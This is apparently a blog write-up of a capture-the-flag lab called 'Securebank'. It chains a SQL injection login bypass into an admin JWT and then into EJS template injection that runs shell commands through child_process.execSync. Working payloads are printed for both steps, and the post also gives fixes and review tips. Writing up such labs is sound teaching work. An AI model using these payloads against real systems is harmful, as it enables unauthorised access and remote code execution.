---
slug: "securebank-sqli-to-ejs-rce"
title: "Securebank: SQL injection, a JWT, and an EJS template that ran as root"
date: "2026-10-16"
category: "ctf"
tags:
  - "CTF"
  - "Web Security"
  - "SQL Injection"
  - "SSTI"
  - "Node.js"
  - "31 Nights of Cyber"
excerpt: "A login bypass handed over an admin JWT. The admin report generator compiled user input as EJS, and process.mainModule did the rest."
---

![Securebank — a two-step chain from login to shell](/images/blog/securebank-sqli-to-ejs-rce/hero.png)

"Part 1 is about web exploit, find the flag. Part 2 is about cryptography, find the key."

I like it when a challenge tells you there are two stages. It sets expectations. It also makes the moment when stage one gives you everything feel slightly unfair — but in a good way.

The target is a login page for "SecureBank v2.1.0 — Legacy auth system migration in progress". That last phrase is doing a lot of foreshadowing.

## The login API

The form posts JSON to `/api/login` and stores the returned JWT in `localStorage`. Invalid credentials return a generic 401. Standard stuff.

The username goes into the query unparameterised, so a boolean-based payload works:

```console
$ curl -s -X POST -H 'Content-Type: application/json' \
    -d '{"username":"admin'"'"' OR '"'"'1'"'"'='"'"'1'"'"' -- ","password":"x"}' \
    http://securebank-<port>.labs.perfectroot.io/api/login
{"success":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...","message":"Login successful"}
```

The token payload:

```json
{"id":1,"username":"admin","role":"admin","iat":...,"exp":...}
```

An admin JWT, without knowing the password. That is the first finding: [SQL injection](https://owasp.org/www-community/attacks/SQL_Injection) in the authentication query. The fix is parameterised queries, full stop. There is no clever sanitisation that makes string concatenation safe.

The token worked on both `/dashboard` and `/admin`:

```console
$ curl -s -H "Authorization: Bearer $TOKEN" http://.../admin
<!DOCTYPE html>... SecureBank - Admin Panel ...
```

![From a login bypass to a shell](/images/blog/securebank-sqli-to-ejs-rce/flow.png)

## The admin panel advertises its own vulnerability

The admin page has a report generator. The HTML says:

```html
<p>Use EJS template syntax to generate custom reports</p>
<textarea ...>Example: <h1>User Report for <%= user.username %></h1></textarea>
```

It tells you the engine. It gives you an example. It posts the template to `/api/report`, and the server renders it.

Testing evaluation is trivial:

```json
{"template":"<%= 7*7 %>"}          -> {"report":"49"}
{"template":"<%= user.username %>"} -> {"report":"admin"}
```

`49` is the moment the challenge stops being about SQL injection. [EJS](https://ejs.co/) compiles templates to JavaScript functions and executes them in the server process. If a user can supply the template, the user can run code.

```json
{"template":"<%= process.version %>"} -> {"report":"v18.20.8"}
{"template":"<%= process.cwd() %>"}   -> {"report":"/srv"}
```

`process` is in scope. `process.mainModule` gives you `require`, and `require('child_process')` gives you a shell:

```
<%= process.mainModule.require('child_process').execSync('id').toString() %>
-> uid=1000(node) gid=1000(node)
```

Not root, but enough. The flag directory was world-readable:

```console
$ ... execSync('ls -la /flag; cat /flag/*')
-rw-rw-rw- 1 1001 1001 50 flag.txt
r00t{ch41n1ng_vuln3r4b1l1t13s_l1k3_4_pr0_8f2a9c4e}
```

"Chaining vulnerabilities like a pro." The flag is self-aware.

## What about Part 2?

The description mentions a cryptography stage, and the obvious target is the HS256 signing key behind the JWTs. If you can recover the secret, you can mint a token with arbitrary claims — no SQL injection required.

For this lab, the SQL injection already returns a valid admin token, so the crypto stage is optional. I noted the path (crack a captured token against a wordlist, or find the key in the source/config) but did not need it. If I were writing this up for a client, I would still test it: a hard-coded JWT secret is an independent finding, and it survives the SQL injection fix.

That is a useful habit: **fixing one bug does not fix the system.** If the JWT secret is weak, the login bypass is just the easy route to the same outcome.

## Root causes

| Finding | Root cause | Fix |
|---|---|---|
| Auth bypass | String-concatenated SQL | Parameterised queries / ORM |
| RCE | User input compiled as EJS | Never compile user templates |
| Credential exposure | JWT in `localStorage` | HttpOnly, Secure, SameSite cookies |
| Weak crypto (stage 2) | Hard-coded HS256 secret | Secret manager, rotation, asymmetric signing |
| Container hardening | World-readable flag | Secrets outside the web root, least privilege |

The EJS finding is the one that turns a medium-severity auth bypass into critical RCE. If you are reviewing a Node app, grep for `ejs.render`, `ejs.compile`, `handlebars.compile`, and `new Function(`. Any of those with user input is a shell waiting to happen.

Safer report generation:

- Use a **logic-less** template format with an allowlist of variables, and render it in a sandbox with no access to `process`, `require`, or the filesystem.
- Better: do not let users supply templates at all. Let them choose from a set of server-defined reports and parameterise the data.
- If you must support custom templates, run them in a separate worker with a minimal scope, a timeout, and no network or filesystem access.

## What I would do differently

I trusted the 401 for a moment longer than I should have. The error message was generic, which is good practice, but the timing and the query behaviour gave it away. I also spent a few minutes trying form-encoded payloads before realising the JSON body was the intended path — both worked, but JSON was cleaner.

The real lesson is about **composition**. Neither the SQL injection nor the EJS rendering is exotic. The chain is what makes it a 100-point challenge and a realistic incident. When you write a report, describe the chain, not just the individual findings. A client can fix a parameterised query and still be owned through the report generator.

## Further reading

- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP — Server-Side Template Injection](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Template_Injection_Prevention_Cheat_Sheet.html)
- [EJS documentation](https://ejs.co/)
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_Cheat_Sheet.html)
- [PortSwigger — JWT attacks](https://portswigger.net/web-security/jwt)

The last standard challenge was a shell service with a blocklist and a 63-character limit. It did not go the way I expected.
